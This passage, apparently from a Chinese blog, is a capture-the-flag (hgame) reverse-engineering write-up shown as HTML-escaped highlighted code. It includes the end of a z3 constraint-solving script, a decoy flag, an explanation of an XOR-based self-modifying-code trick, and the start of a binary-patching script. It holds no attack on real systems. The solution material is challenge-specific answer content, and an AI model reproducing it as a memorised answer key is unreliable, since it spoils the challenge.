style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20428&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11973&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23186&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat:
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;):
      print (chr(model[f[i]]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;real), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;finish&amp;#39;&lt;/span&gt;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hgame{@_FAKE_flag!_do_Y0u_know_SMC?}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交一下发现不正确，说明这是一个假flag，提示我们这道题使用了SMC（self-modifying code）&lt;/p&gt;
&lt;h3 id=&#34;step-1找到smc位置和加密方法&#34;&gt;step 1：找到SMC位置和加密方法&lt;/h3&gt;
&lt;p&gt;既然对某一个片段进行了加密，说明程序中肯定有一部分乱码（或者逻辑混乱的汇编代码）&lt;/p&gt;
&lt;p&gt;在0x409080处找到一大段数字&lt;/p&gt;
&lt;p&gt;交叉引用一下，定位到负责加密代码40699B&lt;/p&gt;
&lt;p&gt;发现是一个简单异或，用刚才找到的一长串方程的那个函数与这段乱码进行逐位异或&lt;/p&gt;
&lt;h3 id=&#34;step-2破解smc&#34;&gt;step 2：破解SMC&lt;/h3&gt;
&lt;p&gt;接下来手动patch一下&lt;/p&gt;
&lt;p&gt;在二进制文件中找到两段代码的位置，进行异或，上网找个二进制文件修改的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;file_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FAKE&amp;#34;&lt;/span&gt;
fr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(file_path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;)
fw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;modify_&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;file_path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;)
